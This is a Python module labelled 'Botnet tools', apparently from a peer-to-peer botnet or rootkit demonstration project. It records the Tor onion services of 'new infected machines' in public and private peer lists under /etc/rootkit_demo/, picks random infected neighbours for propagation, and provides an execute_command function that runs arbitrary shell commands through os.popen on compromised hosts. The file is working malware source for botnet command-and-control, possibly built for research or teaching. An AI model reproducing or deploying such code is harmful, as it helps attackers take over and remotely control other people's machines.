"""Botnet tools"""

import random
import os
import math

from botnet_p2p import (
    MAX_PUBLIC_PEER_LIST_LENGTH,
    logger,
)


files_path = "/etc/rootkit_demo/"
public_peer_list_path = files_path + "public/peer_list"
private_peer_list_path = files_path + "private/full_peer_list"


def change_peer_lists_locations(
    public_peer_list_new_path: str, private_peer_list_new_path: str
):
    global public_peer_list_path
    global private_peer_list_path

    public_peer_list_path = public_peer_list_new_path
    private_peer_list_path = private_peer_list_new_path


def add_new_infected_machine(msg_data: str):
    """ Store onion services from new infected machine
        in some files.

        Args:
            msg_data: The username of the first created user in the infected machine,
                      and the onion services created
    """
    __append_to_file(private_peer_list_path, msg_data)

    if not __public_peer_list_reached_maximum_length():
        __append_to_file(public_peer_list_path, msg_data)
    else:
        __overwrite_random_line_in_file(public_peer_list_path, msg_data)


def execute_command(command: str) -> str:
    result = os.popen(command).read()
    return result


def select_random_neighbour() -> str:
    with open(private_peer_list_path, "r") as private_peer_list:
        lines = private_peer_list.readlines()
        num_lines = len(lines)
        random_number = random.randint(0, num_lines - 1)
        text_line = lines[random_number]

    comm_onion = text_line.strip().split(" ")[-1]
    return comm_onion

def __public_peer_list_reached_maximum_length() -> bool:
    try:
        logger.debug(public_peer_list_path)
        with open(public_peer_list_path, "r") as peer_list:
            num_lines = sum(1 for line in peer_list)
    except FileNotFoundError:
        num_lines = 0

    return num_lines == MAX_PUBLIC_PEER_LIST_LENGTH


def __append_to_file(file_: str, data: str):
    with open(file_, "a") as f:
        f.write(data + "\n")


def __overwrite_random_line_in_file(file_: str, data: str):
    """ Overwrite a random line of the file

        Args:
            file_: File in which we will overwrite a line
            data: Text to write in the file
    """
    line_to_overwrite = random.randint(0, MAX_PUBLIC_PEER_LIST_LENGTH - 1)
    with open(file_, "r") as public_peer_list:
        lines = public_peer_list.readlines()
        lines[line_to_overwrite] = data + "\n"

    with open(file_, "w") as public_peer_list:
        public_peer_list.write("".join(lines))
